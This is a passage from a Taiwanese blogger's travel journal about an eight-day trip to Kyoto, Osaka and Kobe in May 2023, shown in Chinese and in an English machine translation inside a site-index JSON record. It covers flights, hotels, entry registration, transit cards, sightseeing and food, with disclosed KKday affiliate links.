第二步，領完行李出關，點擊「海關申報 QR 碼」(藍碼)在自助出關審查機器上，掃描完護照及此 QR 碼，確認完畢即可完成出關入境。Day 1 出發登入航空公司網站或 Email 進行線上報到，並可以直接把機票加入 Apple Pay，完全電子化。A1 台北車站 預辦登機因為是中午的飛機，早上慢慢出門，9 點到機捷 A1 台北車站辦理預辦登機：預辦登機 = 在 A1 台北車站 (A13 新北產業園區也有) 就辦好報到＋行李安檢＋托運行李了；到機場就能直接出境，不用去櫃檯人擠人。如果是從捷運走過來，記得不要直接下手扶梯到底進機捷，預辦登機在機捷外面。限制： 只有部分航空公司可以，詳情請參考 官方網站 需當日航班起飛前3小時完成登機手續、行李託運服務時間： A1 台北車站 06:00~21:30 A3 新北產業園區站 09:00~16:00兩手空空搭機捷去機場 -&gt; 第二航廈記得先上 機捷官網查詢機場 直達車 班次，比較好控制到機場的實際時間； 務必要搭直達車 。等飛機太早出門＋預辦登機，出境後還有快 3 小時才起飛。中午沒什麼人的機場吃個林東芳牛肉麵等飛機居然有興波咖啡！因降落延後導致起飛也跟著延誤了一個多小時不知道是不是因為預辦登機的關係，候機時地勤有廣播唱名我們去確認人有到，有要登機。Bye 🇹🇼飛機著陸，換好日本 SIM 卡連上網路之後就可以登入 Vista Japan 完成入境及出關手續。前往京都出關西機場後我們就直接搭 JR關空特急HARUKA 到 京都車站 ，大約 1 個半小時，途中只停靠幾站就到了。建議去售票機買票才會一定有座位。一出車站就看到標誌性的京都塔再轉搭計程車到飯店(因為有行李箱就不搭公車了，不然有公車會到)；加上飛機延誤，第一天到飯店的時候已經晚上 9 點多。東橫INN京都四條大宮飯店櫃檯有一位姊姊會說中文，跟他請教了明日的行程要怎麼去比較順～很親切方便！房間很酷，是萬全鏡像的兩個單人間然後打通共用衛浴。はなまる串カツ 製作所 大宮店時間很晚了，飯店東西放完就走出來到附近找吃的，選定了一家炸串店進去。梅子茶泡飯最便宜一串 80 日圓起，新鮮好吃又便宜！意外的驚喜跟喜愛，第二天想再造訪就遇到店休了 QQ吃完不免俗要去便利店 LAWSON 買宵夜回飯店繼續吃：醬油炒麵普普，吃起來很膩。Day 2 (清水寺、金閣寺、京都塔)一早起床先下樓打包早餐回房間吃：咖哩飯，吃完有點太 Heavy 還是習慣西式或台式的早餐。八坂神社吃飽飯搭公車前往八坂神社：一路步行前往清水寺京都的街頭乾淨到可怕，就連路邊水泥墩都不會出現髒髒黑黑的狀況。從八坂神社往上走到清水寺大約要 1–2 公里多，不過就當看街道風景吧！八坂塔中途找了家店喝了冰抹茶跟吃黑糖糰子：還有好吃的清酒冰淇淋：清水寺抵達太陽很大，人很多音羽瀑布排隊引用祈求學業、戀愛、健康長壽。參拜結束下山走回八坂神社，路上隨便吃了個蓋飯跟跟風買杯%咖啡下午搭公車前往「高雄」…. . (開玩笑的，是金閣寺)下車後大約走個 15 分鐘即可抵達金閣寺：金閣寺回程公車站擠了很多人，腳勤的朋友可以跟我們一樣走到下一個街口搭其他路線公車避開人群，前往京都塔。京都塔約莫下午 5:30 抵達京都塔觀景台：可以鳥望萬里無緣的京都，樓下有酒吧；本來想說先下去休息一下，晚上再上來看夜景，但我們吃飽要上來的時候才發現不能重新入場，要再重買票，所以就放棄了。補一張出去後從外拍的京都塔夜景。(天氣真的很好)可愛小物一樣去超商買個宵夜泡麵回飯店吃。Day 3 (嵐山、大阪)第二天就沒吃飯店的早餐了，一早睡飽起來 check-out 寄放行李，出門去嵐山。吃麥當勞早餐(比台灣便宜 $15 塊)吃完直接走到對面搭車到嵐山四條大宮就是起站，直接搭到底站嵐山，非常方便而且一定有位子。嵐山抵達：後先往嵐山方向走：可以體驗坐船看看河景(類似小碧潭？)體力好可以選擇小小健行登山：我們跑去登山看猴子跟鳥瞰景觀，從山下到山上大約要 30–45 分鐘，不難走。真的有猴子下山後往回走，路上邊吃了午餐天婦羅蕎麥麵：點錯，不應該點洞飯，會變成蕎麥麵＋天婦羅洞飯。吃飽後往另一個方向前往「大本山天龍寺」：大本山天龍寺從天龍寺後門出來直接去竹林：人真的很多，拍照要找好角度🥵由下往上拍也很美。下山吃冰，準備打道回府順手買了當地產的清酒回四條大宮去飯店領行李準備前往大阪：飯店外就是阪急大宮站第一天來這的時候還覺得有點不方便，因為離京都站有距離；但後來才發現其實很讚；在金閣寺、清水寺的中心點，出來就有往嵐山的直達電車，要去大阪也是直接出來搭電車就到了（記得大概一小時）。大阪初來乍到覺得好容易迷路，出口很多，大阪、梅田其實只的都是同個地點。抵達 APA 飯店”)黃馨平飯店頂樓有免費的露天泳池、飯店內有超商、免費大眾湯屋。放完行李後出門覓食：テング酒場 曽根崎 お初天神通り店，五串烤雞肉 日幣385…比台灣便宜啊！吃飽後在車站附近亂逛遊樂場有對自己吐槽的白熊！！Day 4 大阪城、鶴橋、任天堂按照 Google Map 指示，搭電車再走路到大阪城，走路部分一路從車站到護城河再到主城，大概需要走 30 分鐘，有點距離。 人工櫃檯排隊買票排得非常長，可以從 網路購買 免排隊直接入場。大阪城登頂鳥瞰大阪景觀：裡面每層都有戰國歷史介紹：離開大阪城後在附近走了一大圈晃晃兼找吃的。然後前往市郊鶴橋找一些小店買東西。鶴橋在鶴橋走了一大圈，這邊應該是非觀光區，遊客很少；蠻多韓國周邊商店，比較像日本人的韓國城。單純來找小點買韓國文創小物，後來發現台灣也有賣 - _ -任天堂走了一大圈大阪，腳底要不行了；所幸折返回去，回大阪梅田車站時順路去逛了一下任天堂。大阪任天堂，就在車站旁邊的大丸百貨樓上。直接失心瘋買爆薩爾達周邊：每個東西都很有質感，徽章是金屬的，做工很細緻。Day 5 環球影城 KKday 日本環球影城 | 環球特快入場券（快速通關 Express Pass）沒買到快速通關、超級瑪利歐世界，也沒有提早起床去排隊；我們走一個佛系隨性路線，10 點多才入園。入園人數非常多，一入園就趕快在 App 抽看看超級瑪利歐世界門票；還好有大神 黃馨平 ，抽中瑪利歐世界 5 點入場資格。先去哈利波特主題區晃晃：奶油啤酒排隊買了奶油啤酒(無酒精、很甜)，覺得如果真的要收藏應該要買最貴玻璃的。下一站侏儸紀公園：排了遊樂設施，大約要排 45 分鐘；坐第一排。類似火山歷險，最後會往下衝🥵（我很怕失重感）。但還好有玩，後來看新聞，這個設施 6 月開始要重新整理，大概會停個幾年。玩完接近中午開始亂逛加覓食裡面的造景很真實，不說還以為在🇺🇸NO LIMIT! Parade! 遊行耀西！！初期意外的歡樂有趣，直至今日腦中還有那個旋律！會有花車（馬力歐、寶可夢、芝麻街…角色）還會有舞者帶動跳，每到一個段落會停下來拉大家一起動起來！所有工作人員包含維護秩序的也會一起跳，帶入感很強！超級瑪利歐世界東晃西晃約莫接近五點前往超級瑪利歐世界。不得不讚嘆這個場景設計，完全把遊戲世界搬到現實，猶如來到世外桃源！！因為接近閉園時間，就沒有買手錶玩互動場景，只去排了耀西的設施。每個細節都做得很精緻！道別閉園前去拍了一些環球的夜景，很多本來人擠人的地方，都變很好拍了。尤其是哈利波特主題區，原本魔杖互動的場景都排的很長，閉園前去都沒人，看到一個姊姊一個人玩爽爽每個互動場景ＸＤ最後拍了一下地球，再見環球。晚上吃了居酒屋，買了日清泡麵回去當宵夜（吃來吃去還是這個好吃）Day 6 神戶、道頓堀一早起床搭電車去神戶。先去逛神戶商店街嚐嚐有名的神戶牛可樂餅從商店街一路走到神戶港走到才發現神戶塔維修中QQ詳細完工時間不確定再走回程，一路逛逛神戶街道在神戶找了家咖啡廳休息一下：草莓巧克力奶昔冰沙，好喝但很甜。道頓堀從神戶去道頓堀一代晚餐去吃有名的 大阪新世界串カツいっとく 。吃完開始觀光客行程，拍拍景點、去藥妝店買東西。格力高回來台灣 看 IG 才發現拍錯了 ＸＤ，從旁邊百貨進去有更好的取景點。回飯店繼續吃泡麵喝清酒當宵夜。味道沒印象 KKday 大阪觀光必備景點套票｜大阪樂遊券 OSAKA e-PASSDay 7 甲子園、難波、藥妝、逛街採購倒數最後一天回台灣了，純走馬看花行程。甲子園，打卡失敗一早臨時起意決定去甲子園看阪神虎棒球比賽，搭乘地鐵到甲子園站。出站就是甲子園棒球場。但我們吃了個閉門羹，不像台灣球賽都一定有位子，阪神的比賽賣到 7 月都全部售罄；都要提早就買好，不然只能在球場外面一日遊了。最後在附近吃個東西買個阪神虎周邊、再去客多美喝個咖啡就離開了。我一直以為他叫「咖啡所」阪神虎貼紙難波離開甲子園後去難波走採購逛街行程。順便補吃一下路邊的章魚燒跟蟹腳可能去錯店家，覺得很普。一路又走回道頓堀一代，往後走到唐吉訶德本店。唯一本店有摩天輪逛完傍晚就回大阪，在住的附近找一間居酒屋吃完最後的晚餐。再看一眼最後的大阪夜景。Day 8 回程中午的飛機，一早 7 點就 checkout 準備去關西機場了。今天開始大阪也變天了，開始陰天下雨，正好符合告別的心情。最後拍了一張大阪大樓景觀當告別。 本來打算搭電車到關西機場，但要拖著行李上上下下的；前 一天回來的時候特別探了一下搭客運的路線（包含時間跟車站位子） 一早就先去客運看人多不多，所幸排隊的人不多，我們就買了到關西機場的客運車票，舒舒服服的搭客運直達關西機場了。沿途還能一路欣賞最後的大阪景觀剛到機場被櫃檯排隊人群嚇到，落落長。最後發現排錯櫃檯，我們已經線上點一點完成報到，可以直接去排行李托運櫃檯！直接省了快一小時。 其實很想跟排隊的人說，你現在網頁打開點一點領好電子機票，就能去排托運然後出境了。出境後，關西機場整修中，沒什麼吃的跟店家，最後又買了新世界的豬排咖哩吐司。候機，回台灣囉。下午時分安全抵達台灣，回家休息！🇹🇼戰利品其實沒買什麼東西，就是看到什麼買什麼；藥妝最後比較下來發現京都車站出來的藥妝店最便宜（大概比大阪便宜 $100-$300 日圓）其中唐吉訶德最貴。Yodobashi 的主題曲真的洗腦，在京都逛完直接被洗腦。日本免稅規定是要滿 $5,000 日圓憑護照才能免稅，會用塑膠袋封起來，回國才能拆封（以上是回家拍的，在境內拆封如果出境查到可能要補稅，但感覺也沒在查；但如果要合規定記得注意液體只能托運，如果封起來的東西裡面有液體就只能整包托運）。吃的部分除了有名的零食之外，我比較多找百年老店的地產，不保證好吃但保證百年；大家推薦的零食保證好吃，但保證要排隊+不是百年ＸＤ最後心得還是找好吃的吧！後記第一次去日本直接愛上，回來開始查下一次的日本行程。 其實我 6/7–11 就又跑去東京了 😝 遊記下集待續總體來說，交通方便、安靜、氣侯怡人(五月去體感大約是台灣秋天天氣，晚上會涼)、人與人有邊界感、有禮貌；很喜歡！消費照目前日幣幣值跟物價，其實比台灣還便宜。。。住行： 電車、公車比台灣覆蓋率更高更方便；去這麼多天只有第一天去飯店搭過計程車。 承上雖然交通方便，但日本幅員遼闊，大部分時候腳要夠勤，每天都走快 20,000 步 站左站右不一定，在京都站左在大阪又變站右 公車會等人坐好才開、下車會等你起身慢慢下車；所以不需要在還沒到站就開始騷動，日本人也不喜歡這樣 飯店衛浴，都非常乾淨舒服；再小都有浴缸 馬桶幾乎都是免治馬桶，如果是百貨公司的還會有背景水聲(防尷尬)5/23–5/28 步數巔峰文化： 市容整潔且一體性很強 (e.g. 門口都長一樣，不會出現有幾戶有鞋櫃有幾戶沒有，有就都有沒有就都沒有) 沒有人邊走邊吃，都是在店門口吃完再走 垃圾只能帶回飯店，路邊很少垃圾桶，因此在門口吃完把垃圾還給店家最方便 店家只收自己店家的垃圾 英文基本上不通，只能用很簡單的跟比手畫腳；或用翻譯溝通；但藥妝店、大型購物中心基本上都有中文店員 買票、收據、找錢、給錢要記得直接放/從盤子拿，不要接觸到店員 避免肢體接觸及靠太近 公共運輸上普遍很安靜，尤其公車 拍照攝影盡量不要對著人拍或拍到人臉，上傳社群應該對人臉打馬賽克 拍廟宇要斜拍，不能正拍 重視細節 SOP，另外感覺要融入日本並不容易 日本人普遍穿著很正式或至少會打扮，女生也都很精緻 另外也不要說別人怎樣，我們在環球影城就遇到台灣(他貼🇹🇼在包包上)類似直銷公司的員工旅遊很大聲的在裡面喊口號拍影片「喊什麼 super 讚，業績直直讚」什麼的；因為人本來就多，還擋在路中間，一群人在那喊口號，沒拍好還一直重複拍重複喊，很丟臉。回歸到工作、「產品」上我自己的感覺是如果要攻日本市場，如果單純靠廣告跟市場行銷應該會很困難，頂多打到一些想嚐鮮的人；日本有很強的文化一體性，要想辦法融入他們的生活跟習慣才有機會得到他們的心。另外就是容錯性很低，例如 Bug、意外出現其他語言；對我們來說可能覺得一兩次還好或至少不要常發生就好；對他們來說我覺得是一次可能就黑掉了，因為這個東西不夠嚴謹、不夠重視他們。— — —👑最後附上最 Carry 的旅伴 黃馨平關西行成功！KKday 推廣 【一人成行】京都天橋立一日遊｜伊根灣遊船・天橋立・美山茅屋之里｜大阪難波出發 海之京都《神隱少女》觀光列車一日遊｜丹後紅松號／黑松號・天橋立 View Land・ 觀光船・傘松公園｜大阪出發 【1人成行】京都奈良一日遊｜嵐山＆伏見稻荷大社＆金閣寺＆奈良公園｜可選日式午餐方案（大阪、京都出發） 日本環球影城｜環球影城 Universal Studios Japan 門票 &amp; 環球特快入場券（快速通關 Express Pass） 日本 JR PASS|關西地區鐵路周遊券|eMCO 電子票 日本 JR PASS|關西廣域鐵路周遊券|eMCO 電子票 關西&amp;山陰地區鐵路周遊券 JRPass 日本eSIM卡｜每日高速、總量、無限流量吃到飽方案 如果這篇文章對您有幫助，歡迎使用我的 推廣連結 選購 KKday 商品、行程，我將獲得部分收益，持續更多旅遊創作，謝謝。更多遊記 [遊記] 2025 韓國釜山 8 天 7 夜自由行 [遊記] 2024 山陰廣域地區 島根 出雲 松江 鳥取 姬路 大阪 神戶 7 日獨旅自由行 [遊記] 2024 二訪九州 9 日自由行，經釜山→博多郵輪入境 [遊記] 2023 廣島岡山 6 日自由行 [遊記] 2023 九州 10 日自由行獨旅 [遊記] 9/11 名古屋一日快閃 [遊記] 2023 東京 5 日自由行有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.如果這篇文章對您有幫助，歡迎使用我的 推廣連結 選購 KKday 商品、行程，我將獲得部分收益，持續更多旅遊創作，謝謝： Follow Me on Medium 1K+ Followers 1,407 Total Views Last Statistics Date: 2025-08-15 | 1,391 Views on Medium." }, { "title": "Travel Journal 2023: 8-Day Free Trip to Kyoto, Osaka, and Kobe", "url": "/posts/travel-journals/en/travel-journal-2023-8-day-free-trip-to-kyoto-osaka-and-kobe-76d66c2e34af/", "categories": "Travel Journals", "tags": "Lifestyle, Japan, Kyoto, Osaka, Traveling", "date": "2023-07-07 20:13:20 +0800", "snippet": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版[Travel Journal] 2023: 8-Day Free Trip to Kyoto, Osaka, and KobeRecord of an 8-day f...", "content": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版[Travel Journal] 2023: 8-Day Free Trip to Kyoto, Osaka, and KobeRecord of an 8-day free trip to Kyoto, Osaka, and Kobe in May 2023, including travel and accommodation information.IntroductionPreviously, I had only visited two Southeast Asian countries: Sabah in 2019 🇲🇾 and Bangkok in 2018 🇹🇭, both as part of a tour group.I love the clear blue skies and the carefree indulgence of Southeast Asia.ENFPAs an enthusiastic and impulsive ENFP, the planning for this trip took only two weeks from proposal to departure. The catalyst was my friend Huang Xingping, who happened to have a career gap and is an INFJ, the complementary personality type to my ENFP. I provided the enthusiasm and direction, while he took care of the details, and together we spontaneously decided to go.KKday Promotions One-Person Tour: Day Trip to Amanohashidate from Osaka Namba Kyoto’s “Spirited Away” Sightseeing Train Day Trip from Osaka One-Person Tour: Day Trip to Kyoto and Nara Universal Studios Japan Tickets &amp; Express Pass [Japan JR PASS Kansai Area Rail Pass eMCO Electronic Ticket](https://www.kkday.com/zh-tw/product/25777-jr-kansai-area-pass-japan?cid=19365){:target=”_blank”} [Japan JR PASS Kansai Wide Area Rail Pass eMCO Electronic Ticket](https://www.kkday.com/zh-tw/product/20317-japan-kansai-wide-area-pass?cid=19365){:target=”_blank”} Kansai &amp; San’in Area Rail Pass JRPass [Japan eSIM Card Daily Unlimited Data Plans](https://www.kkday.com/zh-tw/product/137689-japan-high-speed-daily-unlimited-data-japanese-esim?cid=19365){:target=”_blank”} Pre-Trip PreparationsFunSince everything was quite spontaneous, I only planned to visit Universal Studios Osaka, so I bought tickets online. However, due to the short notice, everything was sold out, and I could only get general admission tickets. Popular attractions and theme parks in Japan really need to be booked in advance. This time, I missed out on baseball tickets; there were none available on-site, so I could only do a one-day tour of the venue.Other attractions, temples, and activities were planned on the fly.It’s essential to exchange yen, as most temple entrance fees, souvenirs, charms, and some train tickets (if you want a reserved seat) can only be paid in cash.I exchanged ¥50,000 and ended up with about ¥15,000 left.Travel🛫With less than a month before departure, there weren’t many options left, so I went directly to SkyScanner to find a flight that matched our spontaneous pace:Taoyuan &lt;-&gt; Kansai 5/22 EVA Air BR 130 13:35 TPE -&gt; KIX 17:15 (actual delay of over an hour, arrived in Japan at 18:40) 5/29 EVA Air BR 177 11:10 KIX -&gt; TPE 13:05Round trip: $14,915It seems that since last year, checked baggage has changed to a piece-and-weight system, with a limit of one piece per person, up to 23kg; anything else incurs additional charges. Purchasing flight tickets with a credit card often includes travel insurance, so it’s advisable to buy tickets separately and check your bank’s credit card insurance details, as some debit cards may not have coverage.You can also purchase travel insurance separately (medical, inconvenience, loss, accident, etc.). This time, I covered 8 days for about $1,500.The Flight TrackerI recommend installing The Flight Tracker App to input flight information and track real-time updates, including terminal, gate, and baggage claim information. (It will notify you of any changes, but it’s still best to rely on on-site information.)You can enable the iOS Live Activity feature a few hours before the flight for real-time tracking.📲I purchased an 8-day unlimited SIM card directly from KKDAY for about $700; there’s also an eSIM version, but I prefer using a physical SIM card for peace of mind. You can keep the SIM card (including the SIM card ejector) with you and switch to the Japanese SIM card once the plane safely lands. Remember to enable roaming in the settings after switching and then restart your phone. Japan’s unlimited data plans may not be truly unlimited; speeds may be throttled after a certain data limit, so it’s best to ask the seller for details. If you plan to send or watch videos, connecting to Wi-Fi is recommended.🚈You can use the Suica card directly for trains, subways, or buses; some convenience stores and shops also accept it.For iPhone users, you can go to “Wallet &amp; Apple Pay” -&gt; “Add Card” -&gt; “Transit Card” -&gt; “Japan” -&gt; “Suica” -&gt; and activate the virtual Suica card directly. However, you need to use a MasterCard for topping up; I had trouble topping up with my Visa card. It’s advisable to set up and top up your card in Taiwan first; otherwise, you may find it impossible to top up in Japan and won’t receive SMS verification codes, rendering it unusable.If you can’t use the iPhone Suica or Android, physical Suica cards are currently out of stock in Japan, and you can only buy the 28-day Welcome Suica limited card, which can be topped up and used, but it expires after the deadline and is non-refundable.Apple Watch also supports Suica (not interchangeable with iPhone), so remember to set it up and top it up in Taiwan as well.The iPhone transit card can be used without specifically activating the Apple Pay screen; just take out the device, and it will wake up and sense automatically.AccommodationI mainly used Agoda to find places close to train and subway stations.Kyoto 2 Nights: Toyoko Inn Kyoto Shijo OmiyaToyoko Inn is a chain hotel system recommended by friends from Northeast Asia, known for its high cost-performance ratio and reliability, plus it includes a Japanese breakfast (rice balls or curry rice).Since I booked too late, the only available option was the Toyoko Inn at Shijo Omiya, which is about 3 kilometers from Kyoto Station:Total for 2 people: NT$3,844Osaka 4 Nights: APA Hotel Osaka UmedaAgain, due to late booking, there weren’t many options; we chose another chain hotel, APA, which is closer to the station but more expensive. It doesn’t include breakfast but has facilities like a swimming pool and public bath.It’s about a 15-minute walk from Osaka Umeda Station:Total for 2 people: NT$21,459Pre-Entry Application (Expedited Immigration)No special visa application is required, nor do you need to provide COVID vaccination or nucleic acid test certificates. Once your flight and accommodation are confirmed, you can fill out your entry information on Visit Japan. When you land, just connect to the internet, and you can enter directly. If you haven’t pre-registered, you’ll have to fill out a paper form on-site.1. Register: https://www.vjw.digital.go.jp/main/#/vjwpco001 The password rules may differ from your usual habits, so remember it or write it down to avoid forgetting it when you need to log in at immigration in Japan.2. Select “Register Entry and Return”3. Enter your entry flight informationImage for illustration only.Travel name: Custom, for your reference.4. Enter your contact information in JapanImage for illustration only.I entered the information for the hotel where I would stay on the first night, using Google to find the English version of the hotel address and contact number (it doesn’t need to be too precise, just ensure the hotel name is correct).5. Register your returnImage for illustration only.6. Select “Return Entry and Return Procedures” to continue filling out the information7. Select “Foreign Entry Record”8. Fill in your basic informationThe number of days in the country includes the day of arrival and departure, totaling 8 days.Final step to complete registration:9. Select “Return Entry and Return Procedures” again to fill out “Customs Declaration Preparation”After filling in the basic information, select “No” all the way to complete the registration:10. CompletionSteps for entry: Connect to the internet and log in to the website. First step, immigration inspection, find “Immigration Inspection Preparation” and select “Show QR Code.” Scroll to the bottom of the page to find “Show QR Code.”[Updated 2024–11–25] The “Immigration Inspection” and “Customs Declaration” QR Codes have been merged into a single “Immigration Inspection and Customs Declaration QR Code,” with no distinction between blue and yellow codes. The following content is for record-keeping and can be ignored. Present your passport and QR code to the immigration officer (yellow code). Second step, after collecting your luggage, click on “Customs Declaration QR Code” (blue code).At the self-service customs inspection machine, scan your passport and this QR code to complete the customs entry.Day 1: DepartureLog in to the airline’s website or email for online check-in, and you can add your ticket to Apple Pay for a fully electronic experience.A1 Taipei Station Pre-Check-InSince the flight is at noon, I took my time in the morning and arrived at the A1 Taipei Station at 9 AM for pre-check-in:Pre-Check-In = You can complete check-in, baggage inspection, and baggage drop-off at A1 Taipei Station (A13 New Taipei Industrial Park also offers this service); you can go directly to the airport without queuing at the counter.If you’re coming from the MRT, remember not to go directly down the escalator into the airport express; pre-check-in is outside the express station.Restrictions: Only certain airlines are eligible; please refer to the official website for details. Check-in and baggage drop-off must be completed 3 hours before the flight.Service Hours: A1 Taipei Station 06:00~21:30 A3 New Taipei Industrial Park Station 09:00~16:00Traveling Light to the Airport via Airport Express -&gt; Terminal 2Be sure to check the Airport Express official website for the direct train schedule to better manage your time to the airport; make sure to take the direct train.Waiting for the FlightI arrived too early and, with pre-check-in, had nearly 3 hours to wait after clearing immigration.The airport was quite empty at noon.Enjoying some Lin Dong Fang beef noodles while waiting for the flight.Surprisingly, there was a Xingbo coffee!Our departure was delayed by over an hour due to a late landing.I’m not sure if it was because of the pre-boarding check, but while waiting at the airport, the ground staff made announcements calling out names to confirm who was present and ready to board.Bye 🇹🇼After landing and switching to a Japanese SIM card to get online, I was able to log into Vista Japan to complete the immigration and customs procedures.Heading to KyotoAfter exiting Kansai Airport, we took the JR Kansai Airport Limited Express HARUKA to Kyoto Station, which took about an hour and a half, with only a few stops along the way.I recommend buying tickets from the ticket machine to ensure you have a seat.As soon as we exited the station, we saw the iconic Kyoto Tower.We then took a taxi to our hotel (since we had luggage, we opted not to take the bus, although there is a bus that goes there); combined with the flight delay, we arrived at the hotel after 9 PM.Toyoko Inn Kyoto Shijo OmiyaAt the hotel reception, there was a friendly staff member who spoke Chinese, and I asked her for advice on how to plan our itinerary for the next day—she was very helpful!The room was interesting; it was two single rooms connected with a shared bathroom.Hanamaru Kushikatsu Omiya BranchSince it was late, we dropped off our things at the hotel and went out to find something to eat nearby. We chose a kushikatsu (fried skewers) restaurant.Plum tea riceThe skewers started at just 80 yen each—fresh, delicious, and cheap! It was an unexpected delight, and I wanted to visit again the next day, but unfortunately, the restaurant was closed. QQAfter eating, we made our usual stop at the convenience store LAWSON to buy some late-night snacks to take back to the hotel:The soy sauce fried noodles were just okay and a bit greasy.Day 2 (Kiyomizu-dera, Kinkaku-ji, Kyoto Tower)We woke up early and went downstairs to pack breakfast to eat in our room:Curry rice, which felt a bit heavy after eating; I’m more accustomed to Western or Taiwanese breakfasts.Yasaka ShrineAfter breakfast, we took the bus to Yasaka Shrine:We walked towards Kiyomizu-dera.The streets of Kyoto are so clean that it’s almost scary; even the concrete barriers on the roadside are spotless.Walking from Yasaka Shrine to Kiyomizu-dera is about 1–2 kilometers, but it’s a nice opportunity to enjoy the street scenery!Yasaka PagodaWe stopped at a shop along the way to enjoy some iced matcha and black sugar dumplings:And we also had some delicious sake ice cream:Kiyomizu-deraWe arrived at Kiyomizu-dera:The sun was bright, and there were a lot of people.Otowa WaterfallWe queued to drink from the waterfall, making wishes for academic success, love, and health.After visiting, we walked back down to Yasaka Shrine, grabbing a rice bowl and a cup of % coffee along the way.In the afternoon, we took the bus to “Kaohsiung”… (just kidding, it was Kinkaku-ji)After getting off the bus, we walked about 15 minutes to reach Kinkaku-ji:Kinkaku-jiOn the way back to the bus stop, there were a lot of people, so if you’re feeling energetic, you can walk to the next intersection and take a different bus route to avoid the crowd, heading towards Kyoto Tower.Kyoto TowerWe arrived at the Kyoto Tower observation deck around 5:30 PM:You can see the vast expanse of Kyoto from above; there’s a bar downstairs. We initially thought about going down to rest and then coming back up to see the night view, but when we tried to go back up after eating, we found out we couldn’t re-enter without buying another ticket, so we gave up.Here’s a night view of Kyoto Tower taken from outside after we left. (The weather was really nice.)Cute little itemsWe stopped by a convenience store to buy some instant noodles for a late-night snack back at the hotel.Day 3 (Arashiyama, Osaka)On the second day, we skipped the hotel breakfast, woke up well-rested, checked out, and stored our luggage before heading to Arashiyama.Breakfast at McDonald’s (cheaper than Taiwan by $15)After eating, we walked across the street to catch a ride to Arashiyama.Shijo Omiya is the starting station, and we took the train directly to the last stop, Arashiyama, which was very convenient and guaranteed us a seat.ArashiyamaWe arrived:First, we headed towards the Arashiyama area:You can take a boat ride to enjoy the river views (similar to a small Bitan?).If you’re feeling energetic, you can opt for a little hike up the mountain:We went up the mountain to see monkeys and enjoy the panoramic view; it takes about 30–45 minutes to hike from the bottom to the top, and it’s not too difficult.There really are monkeys!After descending, we walked back and stopped for lunch at a tempura soba restaurant:I ordered the wrong thing; I shouldn’t have ordered the donburi, which turned out to be soba noodles plus tempura donburi.After eating, we headed in another direction towards “Daibutsusan Tenryu-ji”:Daibutsusan Tenryu-jiAfter leaving Tenryu-ji, we went directly to the bamboo grove:There were so many people, so finding a good angle for photos was a challenge. 🥵Taking photos from below looking up was also beautiful.After descending, we had ice cream and prepared to head back.I casually bought some locally produced sake.We returned to Shijo Omiya to pick up our luggage and prepare to head to Osaka:The hotel is right outside Hankyu Omiya Station.When I first arrived here, I thought it was a bit inconvenient because it was far from Kyoto Station; but later I realized it was actually great—it’s centrally located between Kinkaku-ji and Kiyomizu-dera, and there’s a direct train to Arashiyama right outside. It’s also easy to get to Osaka directly from there (about an hour).In Osaka, I found it easy to get lost at first because there are so many exits; Osaka and Umeda are essentially the same location.Arriving at APA Hotel”)Huang Hsin-PingThe hotel has a free rooftop pool, a convenience store inside, and a free public bath.After dropping off our luggage, we went out to find something to eat:Tengoku Sakaba Sonezaki Ohatsu Tenjin Street, five skewers of grilled chicken for 385 yen… cheaper than Taiwan!After eating, we wandered around near the station.There’s a bear in the amusement park that’s roasting itself!!Day 4 Osaka Castle, Tsuruhashi, NintendoFollowing Google Maps, we took the train and then walked to Osaka Castle. The walking part took about 30 minutes from the station to the castle moat and then to the main castle, which is a bit of a distance. The line at the ticket counter was very long; you can buy tickets online to skip the line and enter directly.Osaka CastleWe climbed to the top for a panoramic view of Osaka:Each floor has exhibits about the history of the Warring States period:After leaving Osaka Castle, we walked around the area looking for something to eat.Then we headed to Tsuruhashi in the suburbs to check out some small shops.TsuruhashiWe walked around Tsuruhashi, which seems to be a non-touristy area with very few visitors; there are quite a few Korean shops, making it feel more like a Korean town in Japan.I just came to look for some small Korean cultural items, but later found out they are also sold in Taiwan. -_-NintendoAfter walking around Osaka for a while, my feet were starting to hurt; fortunately, we headed back and stopped by Nintendo on our way back to Osaka Umeda Station.Nintendo Osaka is located right next to the station in the Daimaru department store.I went a bit crazy buying a ton of Zelda merchandise:Everything was high quality; the badges were metal and very finely crafted.Day 5 Universal Studios Japan [**_KKday Universal Studios Japan Universal Express Pass (Fast Pass)_**](https://www.kkday.com/zh-tw/product/18618?cid=19365&amp;ud1=76d66c2e34af){:target=”_blank”} We didn’t buy the express pass or the Super Mario World tickets, nor did we wake up early to queue; we took a laid-back approach and entered the park around 10 AM.The park was incredibly crowded. As soon as we entered, we quickly checked the app for tickets to Super Mario World. Luckily, thanks to the amazing Huang Xingping, we managed to get entry tickets for 5 PM.First, we wandered around the Harry Potter themed area:ButterbeerWe queued to buy some Butterbeer (non-alcoholic and very sweet) and thought that if we were to collect it, we should get the most expensive glass.Next stop: Jurassic Park:We waited about 45 minutes for the ride and got to sit in the front row.It was similar to a volcanic adventure, and at the end, we plunged down 🥵 (I’m really afraid of the feeling of weightlessness).But I’m glad we got to experience it. Later, I saw in the news that this attraction will be undergoing renovations starting in June and will likely be closed for a few years.After playing, we started wandering around and looking for food around noon.The scenery inside was incredibly realistic; you’d think you were in the 🇺🇸.NO LIMIT! Parade!Yoshi!!The initial excitement was unexpectedly fun, and to this day, that melody is still stuck in my head!There were floats featuring characters from Mario, Pokémon, Sesame Street, etc., and dancers encouraging everyone to join in. At each segment, they would stop and get everyone moving! All the staff, including those maintaining order, joined in the dancing, creating a strong sense of immersion!Super Mario WorldAfter wandering around for a bit, we headed to Super Mario World just before 5 PM.I have to praise the design of this area; it completely brings the game world to life, making it feel like a paradise!Since it was close to closing time, we didn’t buy the interactive wristbands and only queued for Yoshi’s ride.Every detail was meticulously crafted!FarewellBefore the park closed, we took some night shots of Universal. Many places that were usually crowded became great spots for photos.Especially in the Harry Potter themed area, where the interactive wand scenes usually had long lines, we found it empty just before closing. I saw a girl enjoying every interactive scene by herself XD.Finally, I took a picture of the globe and said goodbye to Universal.That night, we had dinner at an izakaya and bought some Nissin instant noodles to enjoy as a late-night snack (after trying various snacks, this one still tasted the best).Day 6: Kobe, DotonboriWe woke up early and took the train to Kobe.First, we explored the shopping streets in Kobe.We tried the famous Kobe beef croquettes.We 